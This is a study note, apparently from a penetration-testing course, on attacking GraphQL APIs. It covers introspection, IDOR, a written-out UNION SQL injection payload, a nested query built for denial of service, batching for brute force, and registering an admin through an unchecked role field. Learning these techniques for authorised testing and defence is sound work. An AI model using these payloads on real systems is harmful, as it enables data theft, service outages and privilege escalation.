GraphQL is a query language typically used as an alternative to REST API. Like REST API, GraphQL can update, create, read or delete data.

GraphQL is typically implemented as single endpoint that handles all the queries submitted by users.

Typically the endpoint is located at **/graphql** or **/api/graphql**.

Example of graphQL syntax:
```graphql
{
  users {
    id
    username
    role
  }
}
```

The root is the name of the query. In this query we are retrieving the id, username and role of all users.

The response example is:
```graphql
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "htb-stdnt",
        "role": "user"
      },
      {
        "id": 2,
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```

We have two users with the requested data.

We can, also, query for a user passing a parameter like the username to filter results:
```graphql
{
  users(username: "admin") {
    id
    username
    role
  }
}
```

Another example:
```graphql
{
  users(username: "admin") {
    id
    username
    password
  }
}
```

graphQL support **sub-querying**. For example, a "post" query return a field *author* that holds a *user* object. We can then query the username and role of the author in the following way:
```graphQL
{
  posts {
    title
    author {
      username
      role
    }
  }
}
```

This is the response:
```graphQL
{
  "data": {
    "posts": [
      {
        "title": "Hello World!",
        "author": {
          "username": "htb-stdnt",
          "role": "user"
        }
      },
      {
        "title": "Test",
        "author": {
          "username": "test",
          "role": "user"
        }
      }
    ]
  }
}
```

## Information disclosure in graphQL

We can identify the graphQL engine by using **graphw00f**. Usage example:
```bash
python3 main.py -d -f -t http://IP
```

In some cases we can navigate via **browser to the graphQL interface**. For example, in our case by running graphw00f, we notice that the graphQL endpoint is: `http://IP/graphql`.


## Introspection
Is a graphQL feature that enables users to query the graphQL API **about the structure of the backend system**. So, we can use it to obtain **all queries supported by the API schema**. Example:
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

and then another introspection query like this:
```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

We can **obtain all the queries supported by the backend** using:
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

We can visualize in a better manner the results by using the tool called **graphql-voyager**.

# IDOR in graphQL

For example, we intercept a request that send a query in the body. This body have a parameter called *username*. If we change the value of username, without other security checks, the page the backend answer to us.

From here, for example, we can retrieve the password of another user, using graphQL queries.

# Injection attacks

## SQL Injection
Since GraphQL is a query language, the most common use case is fetching data from some kind of storage, typically a database. As SQL databases are one of the most predominant forms of databases, SQL injection vulnerabilities can inherently occur in GraphQL APIs that do not properly sanitize user input from arguments in the SQL queries executed by the backend.

An example of UNION SQLi in graphQL query:
```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

## XSS
XSS vulnerabilities can occur if GraphQL responses are inserted into the HTML page without proper sanitization.

XSS vulnerabilities can also occur if invalid arguments are reflected in error messages.

# DoS and batching attacks
To execute a DoS attack, we must identify a way to construct a query that results in a large response. Let's look at the visualization of the introspection results in GraphQL Voyager. **We need, typically, to identify a loop between two node of the graph**.

We can abuse this loop by constructing a query that queries the author of all posts. For each author, we then query the author of all posts again. If we repeat this many times, the result grows exponentially larger, potentially resulting in a DoS scenario.

Example:
```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

### Batching
Batching in GraphQL refers to executing multiple queries with a single request. We can do so by directly supplying multiple queries in a JSON list in the HTTP request. For instance, we can query the ID of the user admin and the title of the first post in a single request:
```http
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json
[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```

*Batching is not a security vulnerability but an intended feature that can be enabled or disabled. However, batching can lead to security issues if GraphQL queries are used for sensitive processes such as user login. Since batching enables an attacker to provide multiple GraphQL queries in a single request, it can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests. This could lead to bypasses of security measures in place to prevent brute-force attacks, such as rate limits*.

# Mutations
Mutations are GraphQL queries that modify server data. They can be used to create new objects, update existing objects, or delete existing objects.

Let us start by identifying all mutations supported by the backend and their arguments. We will use the following introspection query:
```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

Hypotize you have a *registerUser* mutation. The mutations requires a *RegisterUserInput* as an input. We can query all fields of the object to obtain all fields that we can use in mutation:
```graphql
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

We can register a new user by running the following example mutation:
```graphql
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

A possible *vulnerability here is the field "role"*. In fact, if there aren't security checks, we can register a new user as "admin" and escalate privileges.

